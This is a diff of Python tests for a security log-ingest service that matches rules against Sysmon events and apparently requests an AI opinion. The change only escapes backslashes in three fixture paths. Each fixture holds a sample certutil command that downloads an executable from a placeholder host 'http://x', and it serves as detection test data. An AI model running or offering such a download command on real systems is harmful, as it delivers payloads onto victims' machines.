@@ -306,7 +306,7 @@ def test_ingest_does_not_trigger_ai_opinion_when_a_rule_matches(api_client, monk
                         "System": _system("1", channel="Microsoft-Windows-Sysmon/Operational"),
                         "EventData": {
                             "Data": [
-                                {"@Name": "Image", "#text": "C:\Windows\System32\certutil.exe"},
+                                {"@Name": "Image", "#text": "C:\\Windows\\System32\\certutil.exe"},
                                 {"@Name": "CommandLine", "#text": "certutil.exe -urlcache -split -f http://x/a.exe"},
                             ]
                         },
@@ -351,7 +351,7 @@ def test_ingest_triggers_ai_opinion_when_a_rule_matches_and_other_events_are_unc
                         "System": _system("1", channel="Microsoft-Windows-Sysmon/Operational"),
                         "EventData": {
                             "Data": [
-                                {"@Name": "Image", "#text": "C:\Windows\System32\certutil.exe"},
+                                {"@Name": "Image", "#text": "C:\\Windows\\System32\\certutil.exe"},
                                 {"@Name": "CommandLine", "#text": "certutil.exe -urlcache -split -f http://x/a.exe"},
                             ]
                         },
@@ -510,7 +510,7 @@ def test_ingest_triggers_ai_opinion_for_named_pipe_discovery_alongside_a_real_ru
                         "System": _system("1", channel="Microsoft-Windows-Sysmon/Operational"),
                         "EventData": {
                             "Data": [
-                                {"@Name": "Image", "#text": "C:\Windows\System32\certutil.exe"},
+                                {"@Name": "Image", "#text": "C:\\Windows\\System32\\certutil.exe"},
                                 {"@Name": "CommandLine", "#text": "certutil.exe -urlcache -split -f http://x/a.exe"},
                             ]
                         },
